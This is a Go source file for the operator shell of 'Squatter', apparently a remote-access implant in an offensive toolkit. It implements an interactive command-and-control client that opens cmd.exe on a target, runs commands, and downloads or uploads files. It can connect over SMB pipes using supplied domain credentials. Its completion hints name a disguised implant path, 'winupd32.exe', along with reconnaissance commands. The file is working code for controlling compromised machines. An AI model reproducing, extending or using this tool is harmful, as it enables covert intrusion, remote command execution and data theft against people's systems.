// Package shell implements the interactive Squatter client shell shared by
// squatterctl and the Hovel Squatter provider session frontend.
package shell

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/Vibe-Pwners/hovel/payloads/squatter/client/wire"
	"github.com/Vibe-Pwners/hovel/payloads/squatter/client/xfer"
	prompt "github.com/c-bata/go-prompt"
	"github.com/charmbracelet/lipgloss"
)

type Client struct {
	conn io.ReadWriteCloser
	r    *bufio.Reader
	sid  uint64
}

func New(conn io.ReadWriteCloser) *Client {
	return &Client{conn: conn, r: bufio.NewReader(conn)}
}

func (c *Client) nextSID() uint64 { c.sid++; return c.sid }

func emit(out io.Writer, payload []byte) {
	_, _ = out.Write(payload)
	_, _ = out.Write([]byte{'\n'})
}

// Run drives the default interactive Squatter shell.
func (c *Client) Run(in io.Reader, out io.Writer) {
	input := bufio.NewReader(in)
	fmt.Fprintln(out, "squatter shell -- run a module: <name> [args...]   (e.g. 'echo a b')")
	fmt.Fprintln(out, "  echo <args...>                  open the echo module (interactive)")
	fmt.Fprintln(out, "  cmd [command...]                open cmd.exe, or run one command through cmd.exe /c")
	fmt.Fprintln(out, "  getfile <remote> [local]        download a file (fixed memory)")
	fmt.Fprintln(out, "  putfile <local> <remote>        upload a file (fixed memory)")
	fmt.Fprintln(out, "  quit                            exit; inside a module, Ctrl-D detaches")
	for {
		fmt.Fprint(out, "squatter> ")
		line, err := input.ReadString('\n')
		if err == io.EOF {
			fmt.Fprintln(out)
			return
		}
		cmd := strings.TrimSpace(line)
		if cmd == "" {
			continue
		}
		if cmd == "quit" || cmd == "exit" {
			return
		}
		parts := strings.Fields(cmd)
		sid := c.nextSID()
		var alive bool
		switch parts[0] {
		case "cmd":
			if cmdInteractive(parts[1:]) {
				if err := c.openStream(sid, "cmd", nil); err != nil {
					fmt.Fprintln(out, "[disconnected]")
					return
				}
				alive = c.runModule(out, sid, "cmd", input)
			} else {
				alive = c.cmdRun(out, sid, parts[1:])
			}
		case "getfile":
			alive = c.cmdGetfile(out, sid, parts[1:])
		case "putfile":
			alive = c.cmdPutfile(out, sid, parts[1:])
		default:
			if err := c.openStream(sid, parts[0], parts[1:]); err != nil {
				fmt.Fprintln(out, "[disconnected]")
				return
			}
			alive = c.runModule(out, sid, parts[0], input)
		}
		if !alive {
			return
		}
	}
}

// RunPrompt drives the rich local Squatter shell used by squatterctl. It uses
// go-prompt for history, editing, completion dropdowns, and terminal redraws.
func (c *Client) RunPrompt(title string) {
	s := &interactiveShell{client: c, title: title}
	s.printBanner()
	p := prompt.New(
		s.execute,
		s.complete,
		prompt.OptionTitle("squatterctl"),
		prompt.OptionLivePrefix(func() (string, bool) { return s.prefix(), true }),
		prompt.OptionPrefix("sq> "),
		prompt.OptionPrefixTextColor(prompt.Fuchsia),
		prompt.OptionInputTextColor(prompt.Turquoise),
		prompt.OptionSuggestionTextColor(prompt.White),
		prompt.OptionSuggestionBGColor(prompt.Black),
		prompt.OptionSelectedSuggestionTextColor(prompt.Black),
		prompt.OptionSelectedSuggestionBGColor(prompt.Fuchsia),
		prompt.OptionDescriptionTextColor(prompt.LightGray),
		prompt.OptionDescriptionBGColor(prompt.Black),
		prompt.OptionSelectedDescriptionTextColor(prompt.Black),
		prompt.OptionSelectedDescriptionBGColor(prompt.Turquoise),
		prompt.OptionScrollbarThumbColor(prompt.Turquoise),
		prompt.OptionScrollbarBGColor(prompt.Black),
		prompt.OptionMaxSuggestion(10),
		prompt.OptionSetExitCheckerOnInput(func(in string, breakline bool) bool {
			return breakline && s.done
		}),
	)
	p.Run()
}

// RunDemo executes the scripted echo walkthrough used by squatterctl.
func (c *Client) RunDemo(out io.Writer) {
	if err := c.openStream(1, "echo", []string{"alpha", "beta", "gamma"}); err != nil {
		fmt.Fprintf(out, "[open failed: %v]\n", err)
		return
	}
	_, _, p, err := wire.ReadFrame(c.r)
	if err != nil {
		fmt.Fprintf(out, "[read failed: %v]\n", err)
		return
	}
	emit(out, p)
	for _, msg := range []string{"hello", "world", "the quick brown fox"} {
		if err := wire.WriteFrame(c.conn, wire.KindData, 1, []byte(msg)); err != nil {
			fmt.Fprintf(out, "[write failed: %v]\n", err)
			return
		}
		_, _, p, err = wire.ReadFrame(c.r)
		if err != nil {
			fmt.Fprintf(out, "[read failed: %v]\n", err)
			return
		}
		emit(out, p)
	}
	if err := wire.WriteFrame(c.conn, wire.KindData, 1, []byte("END")); err != nil {
		fmt.Fprintf(out, "[write failed: %v]\n", err)
		return
	}
	k, _, _, err := wire.ReadFrame(c.r)
	if err != nil {
		fmt.Fprintf(out, "[read failed: %v]\n", err)
		return
	}
	if k == wire.KindClose {
		fmt.Fprintln(out, "[closed]")
	}
}

// RunStreams runs the parallel stream smoke mode used by squatterctl.
func (c *Client) RunStreams(out io.Writer, n int) {
	for s := 0; s < n; s++ {
		_ = c.openStream(uint64(100+s), "echo", []string{fmt.Sprintf("task%d", s)})
	}
	for i := 0; i < n; i++ {
		_, sid, p, _ := wire.ReadFrame(c.r)
		fmt.Fprintf(out, "stream %d: %s\n", sid, p)
	}
	for s := 0; s < n; s++ {
		_ = wire.WriteFrame(c.conn, wire.KindData, uint64(100+s), []byte(fmt.Sprintf("msg-%d", s)))
	}
	for i := 0; i < n; i++ {
		_, sid, p, _ := wire.ReadFrame(c.r)
		fmt.Fprintf(out, "stream %d echoed %q\n", sid, p)
	}
	for s := 0; s < n; s++ {
		_ = wire.WriteFrame(c.conn, wire.KindData, uint64(100+s), []byte("END"))
	}
}

func (c *Client) runModule(out io.Writer, sid uint64, module string, in *bufio.Reader) bool {
	kind, _, payload, err := wire.ReadFrame(c.r)
	if err != nil {
		fmt.Fprintln(out, "[disconnected]")
		return false
	}
	if kind == wire.KindClose {
		fmt.Fprintf(out, "[no such module: %s]\n", module)
		return true
	}
	emit(out, payload)

	for {
		fmt.Fprintf(out, "%s> ", module)
		line, err := in.ReadString('\n')
		if err == io.EOF {
			fmt.Fprintln(out)
			_ = wire.WriteFrame(c.conn, wire.KindClose, sid, nil)
			for {
				k, _, _, e := wire.ReadFrame(c.r)
				if e != nil || k == wire.KindClose {
					return e == nil
				}
			}
		}
		line = strings.TrimRight(line, "\r\n")
		if line == "" {
			continue
		}
		payload := []byte(line)
		if module == "cmd" {
			payload = append(payload, '\n')
		}
		if err := wire.WriteFrame(c.conn, wire.KindData, sid, payload); err != nil {
			fmt.Fprintln(out, "[disconnected]")
			return false
		}
		kind, _, payload, err := wire.ReadFrame(c.r)
		if err != nil {
			fmt.Fprintln(out, "[disconnected]")
			return false
		}
		if kind == wire.KindClose {
			return true
		}
		emit(out, payload)
	}
}

func (c *Client) cmdRun(out io.Writer, sid uint64, args []string) bool {
	if err := c.openStream(sid, "cmd", args); err != nil {
		fmt.Fprintln(out, "[disconnected]")
		return false
	}
	for {
		kind, _, payload, err := wire.ReadFrame(c.r)
		if err != nil {
			fmt.Fprintln(out, "[disconnected]")
			return false
		}
		if kind == wire.KindClose {
			return true
		}
		emit(out, payload)
	}
}

func cmdInteractive(args []string) bool {
	return len(args) == 0 || len(args) == 1 && (args[0] == "-i" || args[0] == "--interactive")
}

func (c *Client) cmdGetfile(out io.Writer, sid uint64, args []string) bool {
	if len(args) < 1 {
		fmt.Fprintln(out, "usage: getfile <remote-path> [local-path]")
		return true
	}
	remote := args[0]
	local := filepath.Base(strings.ReplaceAll(remote, "\\", "/"))
	if local == "" || local == "." {
		local = "download"
	}
	if len(args) > 1 {
		local = args[1]
	}
	f, err := os.Create(local)
	if err != nil {
		fmt.Fprintf(out, "[cannot create %s: %v]\n", local, err)
		return true
	}
	defer f.Close()
	n, err := xfer.GetFile(c.conn, c.r, sid, remote, f)
	if err != nil {
		fmt.Fprintf(out, "[getfile failed: %v]\n", err)
		return c.conn != nil
	}
	fmt.Fprintf(out, "got %s: %d bytes\n", local, n)
	return true
}

func (c *Client) cmdPutfile(out io.Writer, sid uint64, args []string) bool {
	if len(args) < 2 {
		fmt.Fprintln(out, "usage: putfile <local-path> <remote-path>")
		return true
	}
	local, remote := args[0], strings.Join(args[1:], " ")
	f, err := os.Open(local)
	if err != nil {
		fmt.Fprintf(out, "[cannot open %s: %v]\n", local, err)
		return true
	}
	defer f.Close()
	sent, ack, err := xfer.PutFile(c.conn, c.r, sid, f, remote)
	if err != nil {
		fmt.Fprintf(out, "[putfile failed: %v]\n", err)
		return false
	}
	if ack != "" {
		fmt.Fprintln(out, ack)
	}
	fmt.Fprintf(out, "put %s -> %s: %d bytes\n", local, remote, sent)
	return true
}

func (c *Client) openStream(sid uint64, module string, args []string) error {
	return wire.WriteFrame(c.conn, wire.KindOpen, sid, wire.EncodeOpen(module, args))
}

type interactiveShell struct {
	client   *Client
	title    string
	done     bool
	active   string
	activeID uint64
}

func (s *interactiveShell) printBanner() {
	hot := lipgloss.NewStyle().Foreground(lipgloss.Color("205")).Bold(true)
	cool := lipgloss.NewStyle().Foreground(lipgloss.Color("45")).Bold(true)
	muted := lipgloss.NewStyle().Foreground(lipgloss.Color("244"))
	fmt.Println(hot.Render("  ____   ___  _   _    _  _____ _____ _____ ____"))
	fmt.Println(hot.Render(" / ___| / _ \\| | | |  / \\|_   _|_   _| ____|  _ \\"))
	fmt.Println(hot.Render(" \\___ \\| | | | | | | / _ \\ | |   | | |  _| | |_) |"))
	fmt.Println(hot.Render("  ___) | |_| | |_| |/ ___ \\| |   | | | |___|  _ <"))
	fmt.Println(hot.Render(" |____/ \\__\\_\\\\___//_/   \\_\\_|   |_| |_____|_| \\_\\"))
	if strings.TrimSpace(s.title) != "" {
		fmt.Println(cool.Render("squatterctl ") + muted.Render(s.title))
	}
	fmt.Println(muted.Render("tab completes commands, arrows browse history, Ctrl-D exits, detach leaves a module"))
	fmt.Println()
}

func (s *interactiveShell) prefix() string {
	if s.active != "" {
		return s.active + "> "
	}
	return "sq> "
}

func (s *interactiveShell) execute(line string) {
	line = strings.TrimSpace(line)
	if line == "" {
		return
	}
	if s.active != "" {
		s.executeActive(line)
		return
	}
	switch line {
	case "quit", "exit":
		s.done = true
		return
	case "help", "?":
		s.printHelp()
		return
	}
	parts := strings.Fields(line)
	if len(parts) == 0 {
		return
	}
	sid := s.client.nextSID()
	switch parts[0] {
	case "cmd":
		if cmdInteractive(parts[1:]) {
			if err := s.client.openStream(sid, "cmd", nil); err != nil {
				fmt.Println(errorStyle().Render("[disconnected]"))
				s.done = true
				return
			}
			if s.openActive(sid, "cmd") {
				s.active = "cmd"
				s.activeID = sid
			}
			return
		}
		_ = s.client.cmdRun(os.Stdout, sid, parts[1:])
	case "getfile":
		_ = s.client.cmdGetfile(os.Stdout, sid, parts[1:])
	case "putfile":
		_ = s.client.cmdPutfile(os.Stdout, sid, parts[1:])
	default:
		if err := s.client.openStream(sid, parts[0], parts[1:]); err != nil {
			fmt.Println(errorStyle().Render("[disconnected]"))
			s.done = true
			return
		}
		if s.openActive(sid, parts[0]) {
			s.active = parts[0]
			s.activeID = sid
		}
	}
}

func (s *interactiveShell) openActive(sid uint64, module string) bool {
	kind, _, payload, err := wire.ReadFrame(s.client.r)
	if err != nil {
		fmt.Println(errorStyle().Render("[disconnected]"))
		s.done = true
		return false
	}
	if kind == wire.KindClose {
		fmt.Printf("%s\n", errorStyle().Render("[no such module: "+module+"]"))
		return false
	}
	emit(os.Stdout, payload)
	return true
}

func (s *interactiveShell) executeActive(line string) {
	switch line {
	case "detach":
		_ = wire.WriteFrame(s.client.conn, wire.KindClose, s.activeID, nil)
		s.active = ""
		s.activeID = 0
		return
	case "quit", "exit":
		_ = wire.WriteFrame(s.client.conn, wire.KindClose, s.activeID, nil)
		s.done = true
		return
	}
	payload := []byte(line)
	if s.active == "cmd" {
		payload = append(payload, '\n')
	}
	if err := wire.WriteFrame(s.client.conn, wire.KindData, s.activeID, payload); err != nil {
		fmt.Println(errorStyle().Render("[disconnected]"))
		s.done = true
		return
	}
	kind, _, payload, err := wire.ReadFrame(s.client.r)
	if err != nil {
		fmt.Println(errorStyle().Render("[disconnected]"))
		s.done = true
		return
	}
	if kind == wire.KindClose {
		s.active = ""
		s.activeID = 0
		return
	}
	emit(os.Stdout, payload)
}

func (s *interactiveShell) complete(document prompt.Document) []prompt.Suggest {
	return Suggestions(s.active, document.TextBeforeCursor())
}

func (s *interactiveShell) printHelp() {
	style := lipgloss.NewStyle().Foreground(lipgloss.Color("45")).Bold(true)
	muted := lipgloss.NewStyle().Foreground(lipgloss.Color("244"))
	fmt.Println(style.Render("commands"))
	fmt.Println("  cmd [command...]          " + muted.Render("open cmd.exe, or run through cmd.exe /c"))
	fmt.Println("  echo <args...>            " + muted.Render("open the echo module"))
	fmt.Println("  getfile <remote> [local]  " + muted.Render("download from target"))
	fmt.Println("  putfile <local> <remote>  " + muted.Render("upload to target"))
	fmt.Println("  detach                    " + muted.Render("leave an active module"))
	fmt.Println("  quit                      " + muted.Render("close squatterctl"))
}

func errorStyle() lipgloss.Style {
	return lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Bold(true)
}

// Suggestions returns prompt suggestions for the given shell state. It is kept
// separate from go-prompt so tests and future frontends can reuse the metadata.
func Suggestions(activeModule, line string) []prompt.Suggest {
	fields := strings.Fields(line)
	endsWithSpace := strings.HasSuffix(line, " ")
	if activeModule != "" {
		prefix := currentPrefix(fields, endsWithSpace)
		return filterPromptSuggestions([]prompt.Suggest{
			{Text: "END", Description: "ask common demo modules to close"},
			{Text: "detach", Description: "return to the top-level squatter prompt"},
			{Text: "quit", Description: "close squatterctl"},
		}, prefix)
	}
	if len(fields) == 0 || (len(fields) == 1 && !endsWithSpace) {
		return filterPromptSuggestions(topLevelSuggestions(), currentPrefix(fields, endsWithSpace))
	}
	command := fields[0]
	prefix := currentPrefix(fields, endsWithSpace)
	switch command {
	case "getfile":
		return filterPromptSuggestions([]prompt.Suggest{
			{Text: `C:\Windows\Temp\winupd32.exe`, Description: "default Squatter install path"},
			{Text: `C:\boot.ini`, Description: "small XP-era smoke-test file"},
		}, prefix)
	case "putfile":
		return filterPromptSuggestions([]prompt.Suggest{
			{Text: "/etc/passwd", Description: "local file example"},
			{Text: `C:\Documents and Settings\user\Desktop\file.txt`, Description: "remote desktop path example"},
		}, prefix)
	case "echo":
		return filterPromptSuggestions([]prompt.Suggest{
			{Text: "hello", Description: "demo argument"},
			{Text: "operator", Description: "demo argument"},
		}, prefix)
	case "cmd":
		return filterPromptSuggestions([]prompt.Suggest{
			{Text: "--interactive", Description: "open an interactive cmd.exe stream"},
			{Text: "whoami", Description: "print current security context"},
			{Text: "hostname", Description: "print target host name"},
			{Text: "echo hello", Description: "small output smoke test"},
		}, prefix)
	default:
		return nil
	}
}

func topLevelSuggestions() []prompt.Suggest {
	return []prompt.Suggest{
		{Text: "cmd", Description: "open cmd.exe or run one command through cmd.exe /c"},
		{Text: "echo", Description: "open the echo module"},
		{Text: "getfile", Description: "download a file from target"},
		{Text: "putfile", Description: "upload a file to target"},
		{Text: "help", Description: "show command summary"},
		{Text: "quit", Description: "close squatterctl"},
		{Text: "exit", Description: "close squatterctl"},
	}
}

func currentPrefix(fields []string, endsWithSpace bool) string {
	if endsWithSpace || len(fields) == 0 {
		return ""
	}
	return fields[len(fields)-1]
}

func filterPromptSuggestions(suggestions []prompt.Suggest, prefix string) []prompt.Suggest {
	if prefix == "" {
		return suggestions
	}
	var out []prompt.Suggest
	for _, suggestion := range suggestions {
		if strings.HasPrefix(suggestion.Text, prefix) {
			out = append(out, suggestion)
		}
	}
	return out
}

type Mode string

const (
	ModeShell   Mode = "shell"
	ModeDemo    Mode = "demo"
	ModeStreams Mode = "streams"
)

type CLIOptions struct {
	Mode     Mode
	Streams  int
	Host     string
	Port     string
	SMB      bool
	Domain   string
	Username string
	Password string
	Pipe     string
	SMBPort  int
}

func ParseCLI(args []string) CLIOptions {
	opts := CLIOptions{Mode: ModeShell, Streams: 3, Host: "127.0.0.1", Port: "9100"}
	positionals := make([]string, 0, 2)
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--demo":
			opts.Mode = ModeDemo
		case "--streams":
			opts.Mode = ModeStreams
			i++
			if i < len(args) {
				opts.Streams, _ = strconv.Atoi(args[i])
			}
		case "--smb":
			opts.SMB = true
		case "--domain":
			i++
			if i < len(args) {
				opts.Domain = args[i]
			}
		case "--user", "--username":
			i++
			if i < len(args) {
				opts.Username = args[i]
			}
		case "--password":
			i++
			if i < len(args) {
				opts.Password = args[i]
			}
		case "--pipe":
			i++
			if i < len(args) {
				opts.Pipe = args[i]
			}
		case "--smb-port":
			i++
			if i < len(args) {
				opts.SMBPort, _ = strconv.Atoi(args[i])
			}
		default:
			positionals = append(positionals, args[i])
		}
	}
	if len(positionals) > 0 {
		opts.Host = positionals[0]
	}
	if len(positionals) > 1 {
		opts.Port = positionals[1]
	}
	return opts
}
